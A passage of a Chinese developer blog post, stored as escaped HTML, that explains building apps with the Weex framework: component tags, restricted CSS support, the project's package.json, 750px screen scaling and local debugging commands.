bsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;'refresher':\u0026nbsp;refresher,\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;'yx-slider':\u0026nbsp;YXSlider,\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;'block-1':\u0026nbsp;Block1\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;},\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;data\u0026nbsp;()\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;YXBanners:\u0026nbsp;[\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;{\u0026nbsp;title:\u0026nbsp;'',\u0026nbsp;src:\u0026nbsp;'http://doc.zwwill.com/yanxuan/imgs/banner-1.jpg'},\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;{\u0026nbsp;title:\u0026nbsp;'',\u0026nbsp;src:\u0026nbsp;'http://doc.zwwill.com/yanxuan/imgs/banner-2.jpg'},\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;{\u0026nbsp;title:\u0026nbsp;'',\u0026nbsp;src:\u0026nbsp;'http://doc.zwwill.com/yanxuan/imgs/banner-3.jpg'}\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;]\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;},\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;methods:\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;jumpWeb\u0026nbsp;(_url)\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;const\u0026nbsp;url\u0026nbsp;=\u0026nbsp;this.$getConfig().bundleUrl;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;navigator.push({\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;url:\u0026nbsp;util.setBundleUrl(url,\u0026nbsp;'page/web.js?weburl='+_url)\u0026nbsp;,\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;animated:\u0026nbsp;\"true\"\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;});\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\u003cbr\u003e\u0026lt;/script\u0026gt;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果以上代码脱离工程单独出现，基本上是无法得知他是weex工程。此处可切实感受到weex的web开发体验\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e名存实亡的\u0026lt;标签/\u0026gt;\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003e\u0026lt;template\u0026gt;\n  \u0026lt;div\u0026gt;\n    \u0026lt;text v-for=\u003cspan class=\"hljs-string\"\u003e\"(v, i) in list\"\u003c/span\u003e class=“text”\u0026gt;{{v}}\u0026lt;/text\u0026gt;\n    \u0026lt;image style=\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e src=“\u003cspan class=\"hljs-string\"\u003e\"\u0026gt;\u0026lt;/image\u0026gt;\n    \u0026lt;video class=\"\u003c/span\u003evideo\u003cspan class=\"hljs-string\"\u003e\" :src=\"\u003c/span\u003esrc\u003cspan class=\"hljs-string\"\u003e\" autoplay controls @start=\"\u003c/span\u003eonstart\u003cspan class=\"hljs-string\"\u003e\" @pause=\"\u003c/span\u003eonpause\u003cspan class=\"hljs-string\"\u003e\" @finish=\"\u003c/span\u003eonfinish\u003cspan class=\"hljs-string\"\u003e\" @fail=\"\u003c/span\u003eonfail\u003cspan class=\"hljs-string\"\u003e\"\u0026gt;\u0026lt;/video\u0026gt;\n  \u0026lt;/div\u0026gt;\n\u0026lt;/template\u0026gt;\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eweex工程中常用的标签有\u003ccode\u003e\u0026lt;div/\u0026gt;\u003c/code\u003e，\u003ccode\u003e\u0026lt;text/\u0026gt;\u003c/code\u003e，\u003ccode\u003e\u0026lt;image/\u0026gt;\u003c/code\u003e，\u003ccode\u003e\u0026lt;video/\u0026gt;\u003c/code\u003e（组件另算），由此四种标签基本可以满足绝大多数场景的需求，虽说此标签同web工程下的标签用法一致，但此处的标签已不再是我们前端口中常提的html标签，而且名存实亡的weex标签，确切讲是weex组件。\u003c/p\u003e\n\u003cp\u003e通过\u003cstrong\u003eweex-loader、vue-loader、weex-vue-render\u003c/strong\u003e的解析最终转换输出的便是实际的组件，有此设计只是为了完成\u003cstrong\u003e“web开发体验”\u003c/strong\u003e的目标。但是我们身为上层的开发人员要清楚自己每天“把玩”的到底是个什么“鬼”。\u003c/p\u003e\n\u003ch2 id=\"-css\"\u003e阉割版CSS\u003c/h2\u003e\n\u003cp\u003e其实用阉割版来形容 weex 的 css 支持度并不合适，但如果从“web开发体验”的角度来衡量，那么这个形容词也是可以理解的。（此处对weex寄有厚望^_^）\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e单位\u003c/h3\u003e\n\u003cp\u003eweex 中的所有 css 属性值的单位均为 \u003ccode\u003epx\u003c/code\u003e，也可省略不写，系统会默认为  \u003ccode\u003epx\u003c/code\u003e单位。\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e选择器\u003c/h3\u003e\n\u003cp\u003eWeex 中只支持单个类名选择器，不支持关系选择器，也不支持属性选择器。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003e/* 支持单个类名选择器 */\n.one-class {\n  font-size: 36px;\n}\n/* 不支持关系选择器 */\n.parent \u0026gt; .child {\n  padding-top: 10px;\n}\n/* 不支持属性选择器，不支持 v-cloak指令 */\n[v-cloak] {\n  color: \u003cspan class=\"hljs-comment\"\u003e#FF6600;\u003c/span\u003e\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个只是对样式定义的限制，不影响样式类名的使用，在标签中可以添加多个样式类名，如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003e\u0026lt;template\u0026gt;\n  \u0026lt;div class=\u003cspan class=\"hljs-string\"\u003e\"one two three\"\u003c/span\u003e\u0026gt;\u0026lt;div\u0026gt;\n\u0026lt;/template\u0026gt;\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"-\"\u003e盒模型\u003c/h3\u003e\n\u003cp\u003eweex支持css基本的盒模型结构，但需要注意的是\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ebox-sizing\u003c/code\u003e 属性值默认为 \u003ccode\u003eborder-box\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003emargin\u003c/code\u003e，\u003ccode\u003epadding\u003c/code\u003e，\u003ccode\u003eborder\u003c/code\u003e等属性暂不支持合并简写\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"flexbox\"\u003eFlexBox\u003c/h3\u003e\n\u003cp\u003eweex中对flexbox布局支持度很高，但依然有部分属性并不支持，如 \u003ccode\u003ealign-items:baseline;\u003c/code\u003e、\u003ccode\u003ealign-content:space-around;\u003c/code\u003e、\u003ccode\u003ealign-self:wrap_reverse;\u003c/code\u003e等。\u003c/p\u003e\n\u003cp\u003e具体weex对flexbox的支持和布局算法，可通过此文进行了解\u003ca href=\"http://www.jianshu.com/p/d085032d4788\"\u003e由FlexBox算法强力驱动的Weex布局引擎\u003c/a\u003e，此处便不再赘述。\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e显隐性\u003c/h3\u003e\n\u003cp\u003e在 weex 的 ios 和 android 端，并不支持 \u003ccode\u003edisplay\u003c/code\u003e 属性。\u003c/p\u003e\n\u003cp\u003e因此，不能使用 \u003ccode\u003edisplay:none;\u003c/code\u003e 来控制元素的显隐性，因此vue语法中的 \u003ccode\u003ev-show\u003c/code\u003e 条件渲染是不生效的。\u003c/p\u003e\n\u003cp\u003e我们可以使用  \u003ccode\u003ev-if\u003c/code\u003e 代替，或者用  \u003ccode\u003eopacity:0;\u003c/code\u003e 来模拟。\u003c/p\u003e\n\u003cp\u003e需要注意的是，ios和android端并不能使用 \u003ccode\u003eopacity:0;\u003c/code\u003e 来完全模拟 \u003ccode\u003evisibility: hidden;\u003c/code\u003e，因为，当opacity的只小于等于0.01时，native控件便会消失，占位空间还在，但用户无法进行交互操作，点击时会发生点透效果。\u003c/p\u003e\n\u003ch3 id=\"css-3\"\u003eCSS 3\u003c/h3\u003e\n\u003cp\u003eWeex支持css3属性，虽然支持并不够，但相较RN的“不能用”已经是强大很多了。\u003c/p\u003e\n\u003cp\u003e以下几种属性我们在开发前需要知道她的支持度\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003etransform：目前只支持2D转换\u003c/li\u003e\n\u003cli\u003etransition：v0.16.0+的SDK版本支持css过度动画，可根据情况配合内建组件 \u003ccode\u003eanimation\u003c/code\u003e 实现动画交互\u003c/li\u003e\n\u003cli\u003elinear-gradient：目前只支持双色渐变色\u003c/li\u003e\n\u003cli\u003efont-family：weex 目前只支持ttf和woff字体格式的自定义字体\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"-\"\u003e第三方工具库\u003c/h2\u003e\n\u003cp\u003e由于使用了增强版的webpak打包工具weexpack，支持第三方框架也是件自然而然的事情。\u003c/p\u003e\n\u003cp\u003e常用的有 \u003ccode\u003evuex\u003c/code\u003e、\u003ccode\u003evue-router\u003c/code\u003e 等，可根据项目实际情况引入需要的第三方工具库\u003c/p\u003e\n\u003ch2 id=\"npm-\"\u003enpm包管理\u003c/h2\u003e\n\u003cp\u003enpm 包管理是前端开发朋友们再熟悉不过的包管理方式了。这也是为什么ReactNative和Weex都选择这种管理方式的原因。\u003c/p\u003e\n\u003cp\u003e以下是本工程的 package.json 文件，这里就不做讲解了，不熟悉的朋友点这里-\u0026gt;\u003ca href=\"http://www.runoob.com/nodejs/nodejs-npm.html\"\u003eNPM 使用介绍\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003e{\n  \u003cspan class=\"hljs-string\"\u003e\"name\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"yanxuan-weex\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"version\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"1.0.0\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"description\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"a weex project\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"main\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"index.js\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"scripts\"\u003c/span\u003e: {\n    \u003cspan class=\"hljs-string\"\u003e\"build\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"webpack\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"build_plugin\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"webpack --config ./tools/webpack.config.plugin.js --color\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"dev\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"weex-builder src dist -w\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"serve\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"webpack-dev-server --config webpack.dev.js -p --open\"\u003c/span\u003e\n  },\n  \u003cspan class=\"hljs-string\"\u003e\"keywords\"\u003c/span\u003e: [\u003cspan class=\"hljs-string\"\u003e\"weex\"\u003c/span\u003e],\n  \u003cspan class=\"hljs-string\"\u003e\"author\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"zwwill\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"license\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"MIT\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"dependencies\"\u003c/span\u003e: {\n    \u003cspan class=\"hljs-string\"\u003e\"vue\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^2.4.2\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"vue-router\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^2.7.0\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"vuex\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^2.1.1\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"vuex-router-sync\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^4.3.0\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"weex-html5\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^0.4.1\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"weex-vue-render\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^0.11.2\"\u003c/span\u003e\n  },\n  \u003cspan class=\"hljs-string\"\u003e\"devDependencies\"\u003c/span\u003e: {\n    \u003cspan class=\"hljs-string\"\u003e\"babel-core\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^6.21.0\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"babel-loader\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^6.2.4\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"babel-plugin-add-module-exports\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^0.2.1\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"babel-plugin-transform-runtime\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^6.9.0\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"babel-preset-es2015\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^6.9.0\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"babel-runtime\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^6.9.2\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"css-loader\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^0.26.1\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"history\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^4.7.2\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"quick-local-ip\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^1.0.7\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"vue-loader\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^13.0.4\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"vue-template-compiler\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^2.4.2\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"webpack\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^2.7.0\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"webpack-dev-server\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^2.4.2\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"weex-builder\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^0.2.7\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"weex-loader\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"^0.4.5\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"weex-router\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"0.0.1\"\u003c/span\u003e\n  }\n}\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"ui-\"\u003eUI尺寸适配\u003c/h2\u003e\n\u003cp\u003eWeex 容器默认的显示宽度 (viewport) 是 750px，页面中的所有组件都会以 750px 作为满屏宽度。\u003c/p\u003e\n\u003cp\u003e这很像移动设备的逻辑像，比如iPhone 6的物理像素宽为750，逻辑像素\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eType\u003c/th\u003e\n\u003cth\u003eiPhone 3G\u003c/th\u003e\n\u003cth\u003eiPhone 4\u003c/th\u003e\n\u003cth\u003eiPhone 6\u003c/th\u003e\n\u003cth\u003eiPhone 6Plus\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e物理像素\u003c/td\u003e\n\u003ctd\u003e320x480\u003c/td\u003e\n\u003ctd\u003e640x960\u003c/td\u003e\n\u003ctd\u003e750x1134\u003c/td\u003e\n\u003ctd\u003e1080x1920\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e逻辑像素\u003c/td\u003e\n\u003ctd\u003e320x480\u003c/td\u003e\n\u003ctd\u003e320x480\u003c/td\u003e\n\u003ctd\u003e375x667\u003c/td\u003e\n\u003ctd\u003e414x736 \u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e像素比\u003c/td\u003e\n\u003ctd\u003e@1x\u003c/td\u003e\n\u003ctd\u003e@2x\u003c/td\u003e\n\u003ctd\u003e@2x\u003c/td\u003e\n\u003ctd\u003e@3x\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e类比在Weex中，如果所有的显示宽度都是用默认值750，那么显示出来的实际像素信息为\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eType\u003c/th\u003e\n\u003cth\u003eiPhone 3G\u003c/th\u003e\n\u003cth\u003eiPhone 4\u003c/th\u003e\n\u003cth\u003eiPhone 6\u003c/th\u003e\n\u003cth\u003eiPhone 6Plus\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e物理像素\u003c/td\u003e\n\u003ctd\u003e320x480\u003c/td\u003e\n\u003ctd\u003e640x960\u003c/td\u003e\n\u003ctd\u003e750x1134\u003c/td\u003e\n\u003ctd\u003e1080x1920\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e显示像素\u003c/td\u003e\n\u003ctd\u003e750x1125\u003c/td\u003e\n\u003ctd\u003e750x1125\u003c/td\u003e\n\u003ctd\u003e750x1134\u003c/td\u003e\n\u003ctd\u003e750x1333\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e像素比\u003c/td\u003e\n\u003ctd\u003e@0.427x\u003c/td\u003e\n\u003ctd\u003e@0.85x\u003c/td\u003e\n\u003ctd\u003e@1x\u003c/td\u003e\n\u003ctd\u003e@1.44x\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e所以我们在使用weex做UI适配时就没有所谓的@2x图和@3x图，所有的尺寸都是Weex帮我们根据750作为基数宽做的缩放。\u003c/p\u003e\n\u003cp\u003e当然，Weex 提供了改变此显示宽度的API，\u003ccode\u003esetViewport\u003c/code\u003e，通过此方法可以改变页面的显示宽度，可以实现每个页面根据自己的需求改变基数逻辑尺寸\u003c/p\u003e\n\u003cp\u003e因此对于一些固定的icon，不建议使用普通的静态图片或者雪碧图，这里建议使用矢量的字体图片，有以下优点：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e适量图不会变糊\u003c/li\u003e\n\u003cli\u003e使用方便，通过css的字号控制大小，不用适配机型和屏幕尺寸\u003c/li\u003e\n\u003cli\u003e引用ttf文件，体积小，且容易更新\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"-\"\u003e本地调试\u003c/h2\u003e\n\u003cp\u003eWeex的调试方式有多种，如果说RN的调试模式是解放了原生开发的调试，那么weex的调试方式可以说是赋予了web模式调试原生应用的能力。\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e方法一\u003c/h3\u003e\n\u003cp\u003e此方法多用于解决bug，检测控件的布局问题\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# 调试单个页面\u003c/span\u003e\n$ weex debug your_weex.vue\n\u003cspan class=\"hljs-comment\"\u003e# 调试整个工程\u003c/span\u003e\n$ weex debug your/path \u003cspan class=\"hljs-_\"\u003e-e\u003c/span\u003e App.vue\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e执行调试命令后，会将指定的文件打包成 JSBundle，并启动一个 weex Devtool 服务（\u003ca href=\"http://localhost:8088可访问，如下图），同时将\"\u003ehttp://localhost:8088可访问，如下图），同时将\u003c/a\u003e JSBundle 文件传递至该服务跟路径下的weex文件夹内（\u003ca href=\"http://localhost:8088/weex/App.js，实际是下图右边二维码的的内容）。\"\u003ehttp://localhost:8088/weex/App.js，实际是下图右边二维码的的内容）。\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/9/18/70180ce83c48f791832ca2e40ae8533a\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e使用Weex Playground App扫下左二维码进入调试模，见下图\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/9/18/c9346d342b7a3fb73d0080f4ef15dd72\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e再次扫码右方二维码，点击【inspector】即可进入调试模式。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/9/18/125a7705e077810713c293da41c03261\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e每一个控件都是相同的数据结构\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003e\u0026lt;view class=\u003cspan class=\"hljs-string\"\u003e\"WXText\"\u003c/span\u003e frame=\u003cspan class=\"hljs-string\"\u003e\"{{0,0},{414,736}}\"\u003c/span\u003e hidden=\u003cspan class=\"hljs-string\"\u003e\"NO\"\u003c/span\u003e alpha=\u003cspan class=\"hljs-string\"\u003e\"1\"\u003c/span\u003e opaque=\u003cspan class=\"hljs-string\"\u003e\"YES\"\u003c/span\u003e\u0026gt;\u0026lt;/view\u0026gt;\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003eclass：代表原声空间类型\u003c/li\u003e\n\u003cli\u003eframe：表示空间的坐标和大小\u003c/li\u003e\n\u003cli\u003ehidden：代表显隐性，css中visibility设置的值\u003c/li\u003e\n\u003cli\u003ealpha：不透明度，css中opacity设置的值\u003c/li\u003e\n\u003cli\u003eopaque：默认为YES，打开绘图系统性能优化的开关，即不去计算多透明块重合后的真正颜色，从而减小GPU的压力，weex中具体有没有地方可以设置这个开关暂时不清楚，有猎奇心的朋友可以研究下。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"-\"\u003e方法二\u003c/h3\u003e\n\u003cp\u003e此方法多用于开发调试，试试观察结果\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003e$ weex your_weex.vue\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果出现access权限报错，使用管理员指令\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003e$ sudo weex your_weex.vue\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/9/18/42d6f2b3523950ab0691b1b49a54eb5a\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e此时本地同时启动一个watch的服务器用于检查代码变更，自动重新构建JSBundle，视觉同步刷新。\u003c/p\u003e\n\u003cp\u003e上图看到的效果即为H5页面的效果，我们一般在整个单页编写完成后在使用 Weex Playground App 扫码查看真机效果，或者你也可以在编写的同时使用真机观察代码的运行效果，每次重新构建包到重绘的速度还是很快的。\u003c/p\u003e\n\u003cp\u003e但前提是你要保证，你的手机和电脑的连在同一个局域网下，并且使用IP访问。\u003c/p\u003e\n\u003ch1 id=\"weex-\"\u003eWeex的原理\u003c/h1\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" 